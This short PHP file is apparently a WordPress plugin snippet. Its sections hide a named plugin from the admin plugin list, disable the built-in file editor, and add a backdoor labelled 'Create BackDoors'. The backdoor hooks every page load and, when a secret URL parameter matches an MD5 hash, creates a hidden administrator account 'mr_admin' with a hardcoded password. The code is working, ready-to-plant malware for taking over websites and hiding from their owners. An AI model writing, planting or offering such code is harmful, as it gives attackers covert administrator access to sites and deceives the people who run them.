<?php
##------------------------------------------------##
## 01 # Hide My Plugin From Plugins List
##------------------------------------------------##

add_filter(
  'all_plugins',
  function ($plugins) {

    $shouldHide = !array_key_exists('show_all', $_GET);

    if ($shouldHide) {
      $hiddenPlugins = [
        'WordPress-External-Script-Plugin/index.php',
        'index.php',
      ];

      foreach ($hiddenPlugins as $hiddenPlugin) {
        unset($plugins[$hiddenPlugin]);
      }
    }
    return $plugins;
  }
);

##------------------------------------------------##
## 02 # Disable Theme/Plugin File Editor
##------------------------------------------------##

define('DISALLOW_FILE_EDIT', true);

##------------------------------------------------##
## 03 # Create BackDoors
##------------------------------------------------##

add_action('wp_head', 'my_backdoor');
function my_backdoor()
{ // URL : website.com/?backdoor=go
  if (md5($_GET['backdoor']) == '34d1f91fb2e514b8576fab1a75a89a6b') {
    require('wp-includes/registration.php');
    if (!username_exists('mr_admin')) { // user : mr_admin
      $user_id = wp_create_user('mr_admin', 'pa55w0rd!'); // pass : pa55w0rd
      $user = new WP_User($user_id);
      $user->set_role('administrator');
    }
  }
}
